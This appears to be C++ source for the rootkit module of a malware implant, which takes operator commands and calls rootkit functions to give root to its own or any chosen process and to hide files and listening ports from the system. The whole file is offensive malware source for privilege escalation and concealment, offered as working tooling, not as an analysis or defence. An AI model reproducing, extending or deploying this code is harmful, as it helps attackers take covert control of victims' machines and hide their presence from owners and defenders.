#include <boost/filesystem.hpp>
#include <filesystem>
#include <boost/system/system_error.hpp>
#include "../include/json.hpp"
#include <iostream>
#include <regex>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <csignal>
#include <cerrno>
#include <cstring>
#include "Rootkit.h"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
#include "../amazing_rootkit/api/api.h"
#include "../amazing_rootkit/constants.h"

using json = nlohmann::json;

void Rootkit::send_err(json ret_json, std::string str){
    std::cerr << str << std::endl;
    json error_msg;
    error_msg["error"] = str;
    ret_json[module_type] = error_msg;
    save_artifact(ret_json);
}

bool processExists(pid_t pid) {
    // Send signal 0 to the process to check if it exists
    if (kill(pid, 0) == 0) {
        return true;
    } else if (errno == ESRCH) {
        return false;
    } else {
        std::cerr << "Error: " << std::strerror(errno) << std::endl;
        return false;
    }
}

void Rootkit::module_impl()
{
    // We only want to run once
    run_ = false;

    std::cout << "Running " << module_type << " with args: " << args.dump() << std::endl;
    json ret_json;
    std::string error_msg;
    
    int id = std::stoi(std::string(args["id"]));
    std::string rootkit_args = args["args"];

    switch (id) {
        case ROOT_ME: {
            std::cout << "ROOT_ME" << std::endl;
            root_me();
            break;
        }
        case ARB_ROOT: {
            std::cout << "ARB_ROOT" << std::endl;
            pid_t pid = atoi(rootkit_args.c_str());
            if (pid > 0 && processExists(pid)) {
                set_proc_root(pid);
            } else {
                error_msg = "Invalid PID: " + rootkit_args;
                Rootkit::send_err(ret_json, error_msg);
                return;
            }
            break;
        }
        case HIDE_FILE: {
            std::cout << "HIDE_FILE: " << rootkit_args << std::endl;
            // rootkit_args should be a path to vaild file
            if (boost::filesystem::exists(rootkit_args)) {
                hide_filename(rootkit_args.c_str());
            } else {
                error_msg = "File dosen't exist: " + rootkit_args;
                Rootkit::send_err(ret_json, error_msg);
                return;
            }
            break;
        }
        case HIDE_PORT: {
            std::cout << "HIDE_PORT" << std::endl;
            int port = atoi(rootkit_args.c_str());
            if (port > 0) {
                hide_listening_socket((unsigned short)port);
            } else {
                error_msg = "Invalid port number: " + rootkit_args;
                Rootkit::send_err(ret_json, error_msg);
                return;
            }
            break;
        }
        
        default: {
            error_msg = "Unknown ID: " + std::to_string(id);
            Rootkit::send_err(ret_json, error_msg);
            return;
        }
    }

    std::string str = "success";
    ret_json[module_type] = CryptoUtils::base64_encode(std::vector<unsigned char>(str.begin(), str.end()));
    save_artifact(ret_json);
    return;
}